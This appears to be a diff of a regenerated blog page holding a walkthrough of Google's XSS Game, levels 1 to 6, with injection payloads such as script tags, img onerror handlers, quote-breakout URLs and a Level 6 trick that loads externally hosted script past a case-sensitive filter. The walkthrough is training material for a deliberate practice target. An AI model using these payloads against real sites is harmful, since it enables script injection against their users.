@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -123,16 +123,16 @@
                     <p>These are my steps how I've solved the <a href="https://xss-game.appspot.com/">XSS Game</a></p>
 <h2 id="5afaf1679ad0887adebaddb40e0bd3f7">Level 1</h2>
 <p>This is the most obvious and easiest one. Just insert following code and you're done:</p>
-<div class="highlight"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </pre></div>
 <h2 id="228e9da47384bacde793a2b78d488bb0">Level 2</h2>
 <p>Since the <code>script</code> won't work you'll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use <code>img</code> tags along with the <code>onerror</code> attributes. Here you go:</p>
-<div class="highlight"><pre><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">"http://inexist.ent"</span> <span class="nx">onerror</span><span class="o">=</span><span class="s2">"javascript:alert(1)"</span><span class="o">/&gt;</span>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">"http://inexist.ent"</span> <span class="nx">onerror</span><span class="o">=</span><span class="s2">"javascript:alert(1)"</span><span class="o">/&gt;</span>
 </pre></div>
 <!--more-->
 <h2 id="8f60a63315c55e659b1a2dd5064ceae8">Level 3</h2>
 <p>Well this time I had to read some code in order to understand the applications logic. If you toggle the code you'll see <code>index.html</code>:</p>
-<div class="highlight"><pre><span class="p">[...]</span>
+<div class="highlight"><pre><span></span><span class="p">[...]</span>
       <span class="kd">function</span> <span class="nx">chooseTab</span><span class="p">(</span><span class="nx">num</span><span class="p">)</span> <span class="p">{</span>
         <span class="c1">// Dynamically load the appropriate image.</span>
         <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">"Image "</span> <span class="o">+</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">num</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
@@ -141,11 +141,11 @@
 <span class="p">[...]</span>
 </pre></div>
 <p>As you see the <code>num</code> parameter is used to generate the <code>img</code> tag. The ideas was to break-out the quotes and insert some sneaky javascript code. Again I've used the <code>onerror</code> attribute to insert JS. Insert this into the URL address bar and you'll get your <code>alert()</code>:</p>
-<div class="highlight"><pre><span class="nt">https</span><span class="o">://</span><span class="nt">xss-game</span><span class="nc">.appspot.com</span><span class="o">/</span><span class="nt">level3</span><span class="o">/</span><span class="nt">frame</span><span class="nf">#3</span><span class="s1">' onerror='</span><span class="nt">alert</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span><span class="err">'</span><span class="o">;</span>
+<div class="highlight"><pre><span></span><span class="nt">https</span><span class="o">://</span><span class="nt">xss-game</span><span class="nc">.appspot.com</span><span class="o">/</span><span class="nt">level3</span><span class="o">/</span><span class="nt">frame</span><span class="nn">#3</span><span class="s1">' onerror='</span><span class="nt">alert</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span><span class="err">'</span><span class="o">;</span>
 </pre></div>
 <h2 id="309531bbe9a9d3228cd0687ec6e66bed">Level 4</h2>
 <p>This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting <code>https://xss-game.appspot.com/level4/frame?timer='</code> showed me following output:</p>
-<div class="highlight"><pre><span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
+<div class="highlight"><pre><span></span><span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
 
 <span class="nx">startTimer</span><span class="p">(</span><span class="s1">''</span><span class="err">'</span><span class="p">);</span>
 </pre></div>
@@ -153,14 +153,14 @@
 <ul>
 <li>https://xss-game.appspot.com/level4/frame?timer=');</li>
 </ul>
-<div class="highlight"><pre>    <span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
+<div class="highlight"><pre><span></span>    <span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
 
     <span class="nx">startTimer</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span><span class="err">'</span><span class="p">);</span>
 </pre></div>
 <ul>
 <li>https://xss-game.appspot.com/level4/frame?timer=');</li>
 </ul>
-<div class="highlight"><pre>    <span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
+<div class="highlight"><pre><span></span>    <span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
 
 
     <span class="nx">startTimer</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span><span class="err">'</span><span class="p">);</span>
@@ -169,7 +169,7 @@
 <ul>
 <li>https://xss-game.appspot.com/level4/frame?timer=')%3B</li>
 </ul>
-<div class="highlight"><pre>    <span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
+<div class="highlight"><pre><span></span>    <span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
 
 
     <span class="nx">startTimer</span><span class="p">(</span><span class="s1">''</span><span class="p">);</span><span class="err">'</span><span class="p">);</span>
@@ -179,19 +179,19 @@
 <li>https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('</li>
 </ul>
 <p>which resulted in</p>
-<div class="highlight"><pre>startTimer('');alert(1);var b=('');
+<div class="highlight"><pre><span></span>startTimer('');alert(1);var b=('');
 </pre></div>
 <p>I must admit: Nice one!</p>
 <h2 id="05988e43e8f2eb5efdddc2b467c4b2f3">Level 5</h2>
 <p>This one was quite easy. On the first page you can see a link: <code>https://xss-game.appspot.com/level5/frame/signup?next=confirm</code>. Now let's have a look how this <code>next</code> parameter is used in <code>confirm.html</code>:</p>
-<div class="highlight"><pre><span class="p">[...]</span>
+<div class="highlight"><pre><span></span><span class="p">[...]</span>
 <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
       <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">'{{ next }}'</span><span class="p">;</span> <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
 <span class="o">&lt;</span><span class="err">/script&gt;</span>
 <span class="p">[...]</span>
 </pre></div>
 <p>So the window.location is set based on the <code>next</code> parameter. This is a typical case for <em>DOM based XSS</em>.  Besides that we have in <code>signup.html</code>:</p>
-<div class="highlight"><pre><span class="p">[...]</span>
+<div class="highlight"><pre><span></span><span class="p">[...]</span>
 <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">"{{ next }}"</span><span class="o">&gt;</span><span class="nx">Next</span> <span class="o">&gt;&gt;&lt;</span><span class="err">/a&gt;</span>
 <span class="o">&lt;</span><span class="err">/body&gt;</span>
@@ -206,7 +206,7 @@
 </ul>
 <h2 id="b30ce92fb9295725ef29254ba5ae17e1">Level 6</h2>
 <p>This time I had to figure to host my JS code. So I've used <code>pastebin.com</code> to host my <a href="http://pastebin.com/raw.php?i=rTRPYeNk">evil code</a>. Next I had a look at the code. As you can read a new <code>script</code> tag is created and the <code>src</code> attribute is set appropriately. The only catch about it: You're not allowed to have a URL containing <em>https?</em>:</p>
-<div class="highlight"><pre><span class="p">[...]</span>
+<div class="highlight"><pre><span></span><span class="p">[...]</span>
       <span class="k">if</span> <span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^https?:\/\//</span><span class="p">))</span> <span class="p">{</span>
         <span class="nx">setInnerText</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"log"</span><span class="p">),</span>
           <span class="s2">"Sorry, cannot load a URL containing \"http\"."</span><span class="p">);</span>
@@ -215,7 +215,7 @@
 <span class="p">[...]</span>
 </pre></div>
 <p>Afterwards the text after the hash is used as the scripts src:</p>
-<div class="highlight"><pre><span class="c1">// Load this awesome gadget</span>
+<div class="highlight"><pre><span></span><span class="c1">// Load this awesome gadget</span>
 <span class="nx">scriptEl</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
 </pre></div>
 <p>Have you noticed something about the regexp? No?! Seriously not? Ok. It's <strong>not</strong> case-sensitive. You can escape it by using <em>hTTps</em> or any other combination. So the <strong>final PoC</strong>:</p>
@@ -264,7 +264,7 @@
                     <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/blog">blog</a></div>
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/web/">web</a><sup>14</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>35</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/coding/">coding</a><sup>26</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/hacking/">hacking</a><sup>22</sup></div>
